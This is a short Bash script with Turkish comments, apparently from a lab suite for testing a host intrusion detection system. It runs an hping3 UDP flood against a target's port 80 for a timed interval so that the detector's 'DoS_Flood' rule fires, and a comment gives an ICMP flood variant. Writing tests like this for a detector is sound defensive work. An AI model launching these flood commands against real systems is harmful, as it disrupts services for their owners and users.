#!/usr/bin/env bash
# =============================================================================
# 03_dos_flood.sh — hping3 ile hacimsel (volumetrik) DoS flood.
#
# HIDS kuralı:  packets_last_sec >= 100  →  DoS_Flood
# Kural sırası: PortScan → SYN_Flood → DoS_Flood. SYN bayraklı yüksek hacim
# "SYN_Flood" olarak etiketlenir; bu yüzden DoS_Flood etiketini NET almak için
# SYN İÇERMEYEN sel kullanırız (UDP).  Böylece syn_count=0 kalır, yalnız paket
# hızı eşiği (>=100/sn) tetiklenir → "DoS_Flood".
#
# Senaryo: web servisine (port 80) UDP sel ile hizmet dışı bırakma denemesi.
# ICMP alternatifi için:  hping3 -1 --flood "$TARGET"
# =============================================================================
set -euo pipefail
source "$(dirname "$0")/config.sh"
require_tool hping3
need_root "$@"

PORT="${PORT:-80}"
DURATION="${DURATION:-10}"

banner "DoS Flood (hping3 UDP → port $PORT)" "DoS_Flood"
ping_check
echo "${C_YEL}[uyarı]${C_RST} Yüksek hacimli UDP seli. Süre: ${DURATION}s."
countdown 3

# --udp: UDP (SYN yok).  --flood: maksimum hız.  -d 120: 120 baytlık yük.
timeout "${DURATION}s" hping3 --udp -p "$PORT" -d 120 --flood "$TARGET" || true

echo
echo "${C_GRN}[bitti]${C_RST} DoS flood durdu. HIDS panosunda 'DoS_Flood' görmelisiniz."
